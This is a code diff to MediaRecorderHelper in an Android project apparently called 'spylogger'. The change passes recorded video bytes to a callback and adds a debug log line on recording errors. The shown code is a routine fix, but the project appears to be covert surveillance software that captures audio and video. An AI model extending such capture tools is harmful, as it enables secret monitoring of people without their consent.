@@ -13,6 +13,8 @@ import android.view.SurfaceHolder;
 import android.view.SurfaceView;
 import android.view.WindowManager;
 
+import com.gravatasufoca.spylogger.utils.Utils;
+
 import java.io.File;
 import java.io.IOException;
 import java.text.SimpleDateFormat;
@@ -255,7 +257,11 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
         recording = false;
         isPreviewing = false;
         if (callback != null) {
-            callback.onFinish(fileBytes);
+            if(!isVideo()) {
+                callback.onFinish(fileBytes);
+            }else{
+                callback.onFinish(Utils.getBytesFromFile(recordedFile));
+            }
         }
     }
 
@@ -372,6 +378,8 @@ public class MediaRecorderHelper implements MediaRecorder.OnInfoListener,MediaRe
     @Override
     public void onError(MediaRecorder mediaRecorder, int what, int extra) {
         stop();
+        Log.d("SPYLOGGER", "Erro na gravacao de video: !!!!!!!!!!!!!!!!!!" );
+
     }
 
     @Override
